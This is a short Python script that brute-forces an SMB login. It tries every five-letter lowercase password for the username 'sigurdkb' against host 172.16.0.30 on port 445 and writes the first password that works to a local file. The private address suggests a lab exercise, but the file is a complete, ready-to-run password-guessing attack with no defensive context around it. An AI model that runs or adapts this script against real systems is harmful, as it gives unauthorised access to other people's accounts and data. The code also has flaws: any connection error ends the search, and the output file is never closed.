import sys
from string import ascii_lowercase
from smb.SMBConnection import SMBConnection

global username
global port
global ip

username = "sigurdkb"
ip = "172.16.0.30"
port = 445

# Used to limit the amount of letters in use
halfString = "abcdef"


def smbConnecter(password):
    try:
        smb = SMBConnection(
            username=username,
            password=password,
            my_name='',
            remote_name='',
            domain='',
            use_ntlm_v2=True,
            is_direct_tcp=True
        )

        response = smb.connect(ip, port, timeout=5)

        if response:
            print("++ Password is: %s" % password)
            f = open("saveFile.txt", "w")
            f.write(password)
            sys.exit(0)
        else:
            print("-- Incorrect: %s" % password)

    except Exception as e:
        print("!! YOU GOT AN ERROR!")
        print(e)
        sys.exit(0)


for a in ascii_lowercase: # halfString
    for b in ascii_lowercase:
        for c in ascii_lowercase:
            for d in ascii_lowercase:
                for e in ascii_lowercase:
                    smbConnecter(a + b + c + d + e)
